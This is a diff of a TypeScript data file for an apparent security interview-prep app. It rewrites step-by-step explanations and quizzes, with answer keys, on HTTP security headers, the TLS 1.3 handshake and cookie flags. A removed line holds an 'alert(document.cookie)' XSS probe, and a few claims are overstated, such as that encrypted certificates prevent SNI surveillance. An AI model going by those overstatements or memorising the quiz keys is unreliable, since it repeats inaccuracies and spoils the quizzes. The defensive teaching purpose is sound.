-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Legacy X-Frame-Options (DENY / SAMEORIGIN) had major limitations, such as inability to define multi-domain whitelists. Modern CSP Level 3 provides 'frame-ancestors', which takes precedence over XFO. Setting 'frame-ancestors 'none'' ensures the page can never be embedded inside any iframe, eliminating UI redress attacks.",
+        "whyItMatters": "Guarantees that banking portals, checkout screens, and settings pages cannot be covertly framed by attackers.",
+        "securityVerdict": "Complete framing isolation enforced across all modern browser engines.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "W3C CSP Level 3",
+          "method": "HTTP/2 Response Header",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Content-Security-Policy: frame-ancestors 'none'",
+            "X-Frame-Options: DENY"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Web Server / CDN\" }",
-          "securityAction": "Backend service Web Server / CDN enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Refused to display 'https://bank.com' in a frame because it set 'Content-Security-Policy: frame-ancestors 'none''.",
+          "securityAction": "Browser halts rendering inside iframe host evil-game.com; displays frame rejection error.",
+          "statusBadge": "FRAMING REFUSED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "edge_waf",
-        "to": "secure_client",
-        "packet": "Content-Security-Policy: default-src 'self'; frame-ancestors 'none'",
-        "caption": "Step 4: Interview line: \"HTTP security headers provide browser-level defense-in-depth: HSTS eliminates SSL stripping, nosniff defeats MIME confusion, and CSP neutralizes XSS and Clickjacking.\"",
+        "from": "server",
+        "to": "browser",
+        "packet": "Complete Suite: HSTS + CSP + Nosniff + Referrer-Policy",
+        "caption": "Step 4: Interview line: \"Security headers represent defense-in-depth: HSTS mandates HTTPS, CSP restricts script execution and framing, nosniff prevents MIME confusion, and Referrer-Policy prevents credential leakage in URLs.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"HTTP security headers provide browser-level defense-in-depth: HSTS eliminates SSL stripping, nosniff defeats MIME confusion, and CSP neutralizes XSS and Clickjacking.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Security headers represent defense-in-depth: HSTS mandates HTTPS, CSP restricts script execution and framing, nosniff prevents MIME confusion, and Referrer-Policy prevents credential leakage in URLs.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Referrer-Policy: strict-origin-when-cross-origin",
+            "definition": "Sends full URL path on same-origin requests, but only the bare origin on cross-origin HTTPS requests, withholding secrets in query params."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Permissions-Policy",
+            "definition": "Controls browser hardware features (camera, microphone, geolocation) accessible by the page or embedded iframes."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "A hardened web application must deliver a cohesive suite of defensive headers: HSTS (prevents SSL stripping), CSP (mitigates XSS and clickjacking), X-Content-Type-Options: nosniff (stops MIME confusion), Referrer-Policy: strict-origin-when-cross-origin (prevents token leakage in URLs), and Permissions-Policy (restricts camera/geolocation API access).",
+        "whyItMatters": "Standardized browser enforcement prevents entire classes of client-side web vulnerabilities with zero runtime latency penalty.",
+        "securityVerdict": "Defense-in-depth perimeter active across all HTTP response interfaces.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "OWASP Secure Headers Project",
+          "method": "HTTP/2 Hardened Response",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
+            "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; frame-ancestors 'none'",
+            "X-Content-Type-Options: nosniff",
+            "Referrer-Policy: strict-origin-when-cross-origin",
+            "Permissions-Policy: camera=(), microphone=(), geolocation=()"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always configure security headers at the CDN / Reverse Proxy edge (Clo...\" }",
-          "securityAction": "Final defensive control verified: Hardened Client secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "All security headers verified compliant against Mozilla Observatory A+ rating.",
+          "securityAction": "Client browser parses and enforces sandbox parameters prior to executing DOM script tree.",
+          "statusBadge": "OBSERVATORY A+"
         }
       }
     ],
@@ -872,15 +880,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "Always configure security headers at the CDN / Reverse Proxy edge (Cloudflare, Nginx, CloudFront) to guarantee global coverage across all application routes and microservices.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What are the essential HTTP security headers every modern web application must configure?\"?",
+      "question": "Which combination of HTTP response headers represents the gold-standard baseline for defense-in-depth against SSL stripping, clickjacking, and MIME confusion?",
       "options": [
-        "Content-Security-Policy: default-src 'self'; frame-ancestors 'none'",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Strict-Transport-Security, Content-Security-Policy (with frame-ancestors), and X-Content-Type-Options: nosniff",
+        "Access-Control-Allow-Origin: *, Server: Apache, and Cache-Control: no-cache",
+        "X-XSS-Protection: 1; mode=block and Accept-Encoding: gzip, br",
+        "X-Powered-By: Express and Transfer-Encoding: chunked"
       ],
       "correctIndex": 0,
-      "explanation": "Always configure security headers at the CDN / Reverse Proxy edge (Cloudflare, Nginx, CloudFront) to guarantee global coverage across all application routes and microservices."
+      "explanation": "HSTS enforces HTTPS to eliminate SSL stripping; CSP frame-ancestors prevents clickjacking; X-Content-Type-Options: nosniff disables MIME sniffing; and modern CSP script-src directives protect against XSS."
     }
   },
   {
@@ -918,144 +926,147 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Client Hello + Key Share",
+        "label": "ClientHello + KeyShare (1-RTT)",
         "from": "client",
-        "to": "web_server",
-        "packet": "ClientHello (Ciphers + ECDHE Public Key Share)",
-        "caption": "Step 1: Client initiates TLS 1.3 handshake by sending supported ciphers and an ephemeral Elliptic Curve Diffie-Hellman public key share in the first packet.",
+        "to": "server",
+        "packet": "ClientHello (CipherSuites + SupportedGroups + KeyShare ECDHE)",
+        "caption": "Step 1: TLS 1.3 optimizes the handshake to 1-RTT by proactively transmitting ephemeral Diffie-Hellman public key shares in the first message.",
         "status": "normal",
-        "whatIsHappeningTitle": "Step 1: Client Hello + Key Share",
-        "whatIsHappeningText": "Step 1: Client initiates TLS 1.3 handshake by sending supported ciphers and an ephemeral Elliptic Curve Diffie-Hellman public key share in the first packet.",
+        "whatIsHappeningTitle": "Step 1: ClientHello + KeyShare (1-RTT)",
+        "whatIsHappeningText": "Step 1: TLS 1.3 optimizes the handshake to 1-RTT by proactively transmitting ephemeral Diffie-Hellman public key shares in the first message.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "TLS 1.3 (RFC 8446)",
+            "definition": "The modern cryptographic protocol securing web communications, reducing handshake round-trips to 1-RTT and deprecating weak legacy ciphers."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "KeyShare Extension",
+            "definition": "ClientHello extension containing client's ephemeral Diffie-Hellman public key parameters (e.g. X25519 or secp256r1)."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In TLS 1.2, negotiating cipher suites and key shares required two round-trips (2-RTT). In TLS 1.3 (RFC 8446), the client assumes modern cryptographic parameters and proactively sends its ephemeral Diffie-Hellman public key share (e.g. Curve25519) directly inside the ClientHello message alongside its list of supported AEAD cipher suites.",
+        "whyItMatters": "Cuts network connection latency by 50% globally, accelerating mobile and edge web applications.",
+        "securityVerdict": "Proactive key exchange initiates forward-secure session setup in 1 round trip.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "TLS 1.3 (RFC 8446 Record Layer)",
+          "method": "Handshake: ClientHello",
           "headers": [
-            "Host: api.tls.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Version: TLS 1.3 (0x0304)",
+            "CipherSuite: TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384",
+            "Supported_Groups: x25519, secp256r1",
+            "Key_Share: Client public key (32 bytes X25519)"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Root Trust Store\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Root Trust Store.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "Handshake Protocol: Client Hello (SNI: api.service.com)",
+          "securityAction": "Client selects AEAD suites, generates ephemeral private key, and transmits public KeyShare.",
+          "statusBadge": "CLIENT HELLO SENT"
         }
       },
       {
         "id": 2,
-        "label": "Server Hello + Certificate",
-        "from": "web_server",
+        "label": "ServerHello + KeyShare Derived",
+        "from": "server",
         "to": "client",
-        "packet": "ServerHello + X.509 Certificate + Server Key Share",
-        "caption": "Step 2: Server selects cipher suite, provides its own ephemeral key share, and attaches its X.509 digital certificate signed by a trusted CA.",
-        "status": "normal",
-        "whatIsHappeningTitle": "Step 2: Server Hello + Certificate",
-        "whatIsHappeningText": "Step 2: Server selects cipher suite, provides its own ephemeral key share, and attaches its X.509 digital certificate signed by a trusted CA.",
+        "packet": "ServerHello (Selected Cipher + KeyShare ECDHE)",
+        "caption": "Step 2: Server selects cipher, sends its own KeyShare, and both sides independently compute the symmetric master secret.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 2: ServerHello + KeyShare Derived",
+        "whatIsHappeningText": "Step 2: Server selects cipher, sends its own KeyShare, and both sides independently compute the symmetric master secret.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "ECDHE (Ephemeral Diffie-Hellman)",
+            "definition": "Key agreement protocol generating temporary keys per session, guaranteeing Perfect Forward Secrecy."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Perfect Forward Secrecy (PFS)",
+            "definition": "Cryptographic property ensuring that compromise of the server's long-term private key cannot decrypt past recorded sessions."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "The server receives the client's KeyShare, selects a mutual cipher suite (e.g. TLS_AES_256_GCM_SHA384), and replies with its ServerHello and matching KeyShare. Both parties combine their private keys with the counterpart's public key share to compute the shared secret. From this exact point forward, all remaining handshake messages are encrypted.",
+        "whyItMatters": "Eliminates legacy static RSA key exchange where stolen server private keys allowed retrospective decryption of recorded network traffic.",
+        "securityVerdict": "Perfect forward secrecy guaranteed; encryption active before certificates are transmitted.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "TLS 1.3 Handshake Protocol",
+          "method": "Handshake: ServerHello",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Version: TLS 1.3",
+            "Selected_Cipher_Suite: TLS_AES_256_GCM_SHA384",
+            "Key_Share: Server public key (32 bytes X25519)"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Root Trust Store validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Symmetric handshake secret derived. Transitioning to encrypted record layer.",
+          "securityAction": "Server derives Handshake Secret; generates handshake encryption keys using HKDF-Extract and HKDF-Expand.",
+          "statusBadge": "HANDSHAKE ENCRYPTED"
         }
       },
       {
         "id": 3,
-        "label": "Certificate Chain Verification",
-        "from": "client",
-        "to": "ca_store",
-        "packet": "Validate Digital Signature & SAN Hostname",
-        "caption": "Step 3: Client verifies the server certificate against the operating system root trust store, checking expiration, SAN, and OCSP revocation status.",
+        "label": "Encrypted Certificate & Finished",
+        "from": "server",
+        "to": "client",
+        "packet": "EncryptedExtensions + Certificate + CertificateVerify + Finished",
+        "caption": "Step 3: Unlike TLS 1.2, the server certificate is completely encrypted in transit, preventing passive SNI/identity surveillance.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Certificate Chain Verification",
-        "whatIsHappeningText": "Step 3: Client verifies the server certificate against the operating system root trust store, checking expiration, SAN, and OCSP revocation status.",
+        "whatIsHappeningTitle": "Step 3: Encrypted Certificate & Finished",
+        "whatIsHappeningText": "Step 3: Unlike TLS 1.2, the server certificate is completely encrypted in transit, preventing passive SNI/identity surveillance.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Encrypted Certificate",
+            "definition": "TLS 1.3 privacy enhancement where X.509 server identity certificates are transmitted inside the encrypted envelope."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "CertificateVerify",
+            "definition": "Digital signature created using the server's private key proving ownership of the public certificate."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "In TLS 1.2, server certificates were transmitted in cleartext, leaking hostnames and organization identities to network eavesdroppers. In TLS 1.3, the server transmits EncryptedExtensions, its X.509 Certificate, and a CertificateVerify signature under the newly negotiated handshake encryption key, followed by an HMAC Finished verification block.",
+        "whyItMatters": "Protects user privacy against ISP surveillance and state-level passive traffic classification.",
+        "securityVerdict": "Cryptographic authentication completed without plaintext identity leakage.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "TLS 1.3 Encrypted Handshake Layer",
+          "method": "Encrypted Records",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Record_Type: Application Data (Encrypted Handshake Envelope)",
+            "Cipher: AES-256-GCM"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Web Server (:443)\" }",
-          "securityAction": "Backend service Web Server (:443) enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "[Encrypted Payload: EncryptedExtensions, Certificate (api.service.com), CertificateVerify, Finished]",
+          "securityAction": "Client validates X.509 trust chain against root store and verifies CertificateVerify ECDSA signature.",
+          "statusBadge": "CERT VERIFIED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
         "from": "client",
-        "to": "crypto_channel",
-        "packet": "AES-256-GCM Symmetric Stream (PFS)",
-        "caption": "Step 4: Interview line: \"TLS 1.3 uses asymmetric cryptography and CA certificates to authenticate identity, ephemeral Diffie-Hellman to derive keys with Perfect Forward Secrecy in 1-RTT, and AES-GCM for fast symmetric data encryption.\"",
+        "to": "server",
+        "packet": "Finished + 1-RTT Application Data (AES-256-GCM)",
+        "caption": "Step 4: Interview line: \"TLS 1.3 cuts handshake latency from 2-RTT to 1-RTT, encrypts server certificates to protect privacy, mandates Perfect Forward Secrecy via ephemeral Diffie-Hellman, and completely removes insecure legacy ciphers like RSA key exchange and CBC mode.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"TLS 1.3 uses asymmetric cryptography and CA certificates to authenticate identity, ephemeral Diffie-Hellman to derive keys with Perfect Forward Secrecy in 1-RTT, and AES-GCM for fast symmetric data encryption.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"TLS 1.3 cuts handshake latency from 2-RTT to 1-RTT, encrypts server certificates to protect privacy, mandates Perfect Forward Secrecy via ephemeral Diffie-Hellman, and completely removes insecure legacy ciphers like RSA key exchange and CBC mode.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "AEAD (Authenticated Encryption with Associated Data)",
+            "definition": "Modern cryptographic ciphers (AES-GCM, ChaCha20-Poly1305) that provide simultaneous confidentiality and integrity verification."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Deprecated Legacy Ciphers",
+            "definition": "Obsolete primitives eliminated in TLS 1.3: RSA key exchange, CBC mode (vulnerable to POODLE/Lucky13), RC4, SHA-1, and 3DES."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "TLS 1.3 strictly prohibits all broken cryptographic algorithms that plagued TLS 1.2: static RSA key exchange (no forward secrecy), CBC ciphers (vulnerable to padding oracle attacks like BEAST and Lucky 13), RC4, and arbitrary compression (CRIME/BREACH). Only authenticated AEAD ciphers are permitted, establishing a virtually impenetrable transport tunnel.",
+        "whyItMatters": "Guarantees zero exploitable cipher downgrade paths and achieves lightning-fast connection speeds.",
+        "securityVerdict": "Modern zero-trust cryptographic baseline established.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "HTTP/2 over TLS 1.3",
+          "method": "Application Data Exchange",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Protocol: TLS 1.3 / HTTP/2",
+            "Negotiated_Cipher: TLS_AES_256_GCM_SHA384",
+            "Record_Length: 1024 bytes"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"TLS 1.3 cuts handshake latency in half (1-RTT) while enforcing Perfect...\" }",
-          "securityAction": "Final defensive control verified: Encrypted Pipe secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Symmetric session keys active. Bi-directional encrypted application data flowing with 1-RTT handshake.",
+          "securityAction": "Secure channel established. Client dispatches encrypted HTTP request payload.",
+          "statusBadge": "1-RTT SECURED"
         }
       }
     ],
@@ -1094,15 +1105,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Core",
     "interviewTakeaway": "TLS 1.3 cuts handshake latency in half (1-RTT) while enforcing Perfect Forward Secrecy by default. Symmetric encryption is used for data transmission because asymmetric operations are computationally expensive.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does the TLS 1.3 handshake establish confidentiality, integrity, and authenticity?\"?",
+      "question": "What are the primary security and architectural improvements introduced in TLS 1.3 (RFC 8446) over TLS 1.2?",
       "options": [
-        "AES-256-GCM Symmetric Stream (PFS)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Handshake latency reduced to 1-RTT, server certificates encrypted in transit, static RSA key exchange removed in favor of mandatory Perfect Forward Secrecy (ECDHE), and vulnerable CBC ciphers deprecated",
+        "It switches from TCP to UDP and removes certificate authority verification entirely",
+        "It allows clients to transmit unencrypted HTTP passwords if they are hashed with MD5",
+        "It replaces public-key cryptography with pre-shared symmetric master passwords baked into the browser"
       ],
       "correctIndex": 0,
-      "explanation": "TLS 1.3 cuts handshake latency in half (1-RTT) while enforcing Perfect Forward Secrecy by default. Symmetric encryption is used for data transmission because asymmetric operations are computationally expensive."
+      "explanation": "TLS 1.3 reduces the handshake to 1 round-trip by sending key shares in ClientHello; encrypts server certificates to enhance privacy; mandates Perfect Forward Secrecy (ECDHE); and deprecates weak algorithms like static RSA and CBC-mode ciphers."
     }
   },
   {
@@ -1140,140 +1151,144 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Hardened Cookie Issued",
+        "label": "HttpOnly Flag (XSS Cookie Theft Defense)",
         "from": "server",
         "to": "browser",
-        "packet": "Set-Cookie: sid=xyz; Secure; HttpOnly; SameSite=Lax",
-        "caption": "Step 1: Server issues authentication cookie with all three protective attributes configured in the Set-Cookie HTTP response.",
+        "packet": "Set-Cookie: session_id=abc...; HttpOnly",
+        "caption": "Step 1: HttpOnly blocks JavaScript document.cookie access, preventing injected XSS payloads from directly exfiltrating session tokens.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 1: Hardened Cookie Issued",
-        "whatIsHappeningText": "Step 1: Server issues authentication cookie with all three protective attributes configured in the Set-Cookie HTTP response.",
+        "whatIsHappeningTitle": "Step 1: HttpOnly Flag",
+        "whatIsHappeningText": "Step 1: HttpOnly blocks JavaScript document.cookie access, preventing injected XSS payloads from directly exfiltrating session tokens.",
         "terms": [
           {
-            "term": "HttpOnly",
-            "definition": "Flag preventing JavaScript document.cookie access, defeating XSS token theft."
+            "term": "HttpOnly Attribute",
+            "definition": "Cookie flag that instructs the browser to forbid client-side scripts (e.g. document.cookie) from accessing the cookie."
           },
           {
-            "term": "Secure Flag",
-            "definition": "Mandates cookie transmission strictly over encrypted HTTPS connections."
+            "term": "XSS Session Theft",
+            "definition": "An attack where malicious JavaScript reads document.cookie and transmits session tokens to an attacker-controlled server."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "When a cookie is tagged with HttpOnly, the browser's JavaScript runtime hides it from document.cookie, Web Workers, and the DevTools console API. Even if an attacker achieves arbitrary JavaScript execution via Cross-Site Scripting (XSS), they cannot read or exfiltrate the raw session token across the network.",
+        "whyItMatters": "Significantly lowers the severity of XSS vulnerabilities by mitigating direct account takeover and offline token reuse.",
+        "securityVerdict": "Essential first-line defense against script-based token exfiltration.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "RFC 6265bis Cookie Specification",
+          "method": "HTTP/2 Set-Cookie Header",
           "headers": [
-            "Host: api.cookie.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Set-Cookie: session_id=s_829148adfe9; Path=/; HttpOnly; SameSite=Lax",
+            "Content-Type: application/json"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Cookie Jar\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Cookie Jar.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "JavaScript execution: document.cookie returns empty string for session_id.",
+          "securityAction": "Browser engine stores session_id in isolated cookie jar; excludes from DOM JavaScript binding interface.",
+          "statusBadge": "HTTPONLY SEALED"
         }
       },
       {
         "id": 2,
-        "label": "XSS Theft Blocked (HttpOnly)",
-        "from": "xss_threat",
+        "label": "Secure Flag (Plaintext Interception Defense)",
+        "from": "server",
         "to": "browser",
-        "packet": "alert(document.cookie) -> Blocked/Empty",
-        "caption": "Step 2: Injected XSS JavaScript attempts to exfiltrate session tokens. The HttpOnly flag instructs the browser engine to block DOM read access.",
+        "packet": "Set-Cookie: session_id=abc...; Secure",
+        "caption": "Step 2: The Secure flag instructs the browser to ONLY transmit the cookie over encrypted HTTPS channels, preventing MITM sniffing.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 2: XSS Theft Blocked (HttpOnly)",
-        "whatIsHappeningText": "Step 2: Injected XSS JavaScript attempts to exfiltrate session tokens. The HttpOnly flag instructs the browser engine to block DOM read access.",
+        "whatIsHappeningTitle": "Step 2: Secure Flag",
+        "whatIsHappeningText": "Step 2: The Secure flag instructs the browser to ONLY transmit the cookie over encrypted HTTPS channels, preventing MITM sniffing.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Secure Attribute",
+            "definition": "Cookie flag ensuring that the cookie is transmitted only over encrypted TLS (HTTPS) connections."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Passive Eavesdropping",
+            "definition": "Capturing unencrypted plaintext packets over local Wi-Fi networks to harvest authentication cookies."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "If a user on public Wi-Fi inadvertently types 'http://example.com' or follows a plaintext link, the browser would transmit ambient cookies in plaintext without the Secure attribute. The Secure flag mandates that browsers omit the cookie entirely unless the transport channel is encrypted via HTTPS, thwarting network sniffers.",
+        "whyItMatters": "Prevents passive packet capture tools (Wireshark) on untrusted public networks from intercepting credentials.",
+        "securityVerdict": "Ensures cookie transport confidentiality across all network routing hops.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "RFC 6265bis Security Attribute",
+          "method": "Transmission Audit",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Set-Cookie: session_id=s_829148adfe9; Secure; HttpOnly",
+            "Transport-Protocol: TLS 1.3 Encrypted"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Cookie Jar validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Attempted navigation: http://app.com -> Browser withholds cookie; dispatches only on https://.",
+          "securityAction": "Browser verifies active connection security state; blocks transmission over plaintext HTTP.",
+          "statusBadge": "SECURE CHANNEL"
         }
       },
       {
         "id": 3,
-        "label": "Plaintext Sniffing Blocked (Secure)",
-        "from": "browser",
-        "to": "server",
-        "packet": "http:// (Cookie Omitted over Unencrypted Transport)",
-        "caption": "Step 3: The Secure flag mandates that the browser will never attach this cookie to unencrypted HTTP requests, defeating network eavesdropping.",
+        "label": "SameSite=Strict vs Lax (CSRF Defense)",
+        "from": "server",
+        "to": "browser",
+        "packet": "Set-Cookie: session_id=abc...; SameSite=Lax",
+        "caption": "Step 3: SameSite controls whether cookies are attached to cross-site requests, mitigating Cross-Site Request Forgery (CSRF).",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Plaintext Sniffing Blocked (Secure)",
-        "whatIsHappeningText": "Step 3: The Secure flag mandates that the browser will never attach this cookie to unencrypted HTTP requests, defeating network eavesdropping.",
+        "whatIsHappeningTitle": "Step 3: SameSite Attribute",
+        "whatIsHappeningText": "Step 3: SameSite controls whether cookies are attached to cross-site requests, mitigating Cross-Site Request Forgery (CSRF).",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "SameSite=Strict",
+            "definition": "The cookie is never sent in cross-site requests, even when following top-level incoming hyperlinks."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "SameSite=Lax",
+            "definition": "The cookie is withheld on cross-site subrequests (img, iframe, POST), but sent when users follow top-level GET navigations."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Before SameSite, browsers sent ambient cookies on ALL requests matching domain/path, enabling CSRF attacks from external sites. SameSite=Strict provides total isolation but can degrade UX when clicking external links. SameSite=Lax (the modern browser default) strikes a balance: it blocks cookies on cross-origin POST, iframe, and script fetches while sending them on top-level user link clicks.",
+        "whyItMatters": "Virtually eliminates traditional Cross-Site Request Forgery (CSRF) for state-changing POST/PUT requests.",
+        "securityVerdict": "Context-aware cookie isolation prevents ambient credential abuse.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
